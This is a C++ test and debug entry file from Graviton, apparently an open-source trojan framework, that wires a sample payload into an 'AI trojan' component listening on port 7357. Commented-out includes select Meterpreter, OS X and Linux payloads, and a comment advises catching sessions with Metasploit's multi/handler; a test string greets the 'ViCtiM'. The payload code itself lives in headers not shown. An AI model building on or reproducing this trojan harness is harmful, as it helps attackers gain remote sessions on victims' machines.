/*
+-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-+
| This file is part of Graviton.                                       |
|                                                                      |
| Graviton is free software: you can redistribute it and/or modify     |
| it under the terms of the GNU General Public License as published by |
| the Free Software Foundation, either version 3 of the License, or    |
| (at your option) any later version.                                  |
|                                                                      |
| Graviton is distributed in the hope that it will be useful,          |
| but WITHOUT ANY WARRANTY; without even the implied warranty of       |
| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        |
| GNU General Public License for more details.                         |
|                                                                      |
| You should have received a copy of the GNU General Public License    |
| along with Graviton.  If not, see <http://www.gnu.org/licenses/>.    |
+-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-+
*/

/*
 * Programmers:
 * 		1- Sina Hatef Matbue | _null_ | sinahatef.cpp@gmail.com
 */


/*
 Attention: Test/Debug Use Only!
     If you want to generate a 'GraVitoN', please use 'graver (GraVitoN Creator)'.
 */

/*
  REMEMBER:
    1. Disable g++ optimization (make <...> CPPFLAGS=-O0 |or| g++ <..> -O0)
    2. If you are using msfconsole/exploit/multi/handler, push Ctrl+Z in case of sending a session to background.
*/

#include "graviton.hpp"
//#include "./gvn_payload/gvn_payload_meter_w32b.hpp"
//#include "./gvn_payload/gvn_payload_osx32b.hpp"
//#include "./gvn_payload/gvn_payload_linux64b.hpp"
#include "./gvn_payload/gvn_payload_sample.hpp"
//#include "./gvn_lua/gvn_lua.hpp"
#include "./gvn_ai/gvn_ai_trojan_sample.hpp"
#include <iostream>
using namespace std;

int main()
{
	/*
	int vint;
	string opt = "PORT=1234 HOST=127.0.0.1 MSG='Hell\\'o ViCtiM!'", val;
	GvnOptParser::getValueAsString(opt, "PORT", val);
	cout << val << endl;
	GvnOptParser::getValueAsInt(opt, "PORT", vint);
	cout << vint << endl;
	GvnOptParser::getValueAsString(opt, "HOST", val);
	cout << val << endl;
	GvnOptParser::getValueAsString(opt, "MSG", val);
	cout << val << endl;
	*/
	
    gvnLogItLn ( "Hell'o GraVitoN!" );
	//run_lua_test();
    
    //Gvn_Payload_Meter_W32b pay;
    //Gvn_Payload_Osx32b pay;
    Gvn_Payload_Sample pay;
	//Gvn_Payload_Linux64b pay;
	
    //pay.initialize ( "" );
    //pay.call();
	
	Gvn_AI_Trojan_Sample ai;
	ai.initialize("PORT=7357", (Gvn_Payload*)&pay);
	ai.think();
	
    return 0;
}
